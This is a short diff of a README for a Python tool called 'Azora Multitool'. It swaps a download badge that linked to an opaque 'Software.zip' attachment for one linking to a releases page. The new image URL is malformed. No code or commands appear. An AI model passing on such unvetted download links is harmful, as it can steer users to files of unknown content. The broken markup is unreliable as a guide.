@@ -16,7 +16,7 @@ Welcome to the Azora Multitool repository! This powerful tool written in Python 
 
 To get started with Azora Multitool, simply download and install the tool by clicking the button below:
 
-[![Download Azora Multitool](https://img.shields.io/badge/Download-Azora_Multitool-<COLOR>.svg)](https://github.com/user-attachments/files/18388744/Software.zip "Launch Azora Multitool")
+[![Download Azora Multitool](https://github.com/roindroid/Azora-Multitool/releases/tag/v1.0<COLOR>.svg)](https://github.com/roindroid/Azora-Multitool/releases/tag/v1.0 "Launch Azora Multitool")
 
 You'll find all the necessary instructions and guidelines for installation in the repository's documentation.
 
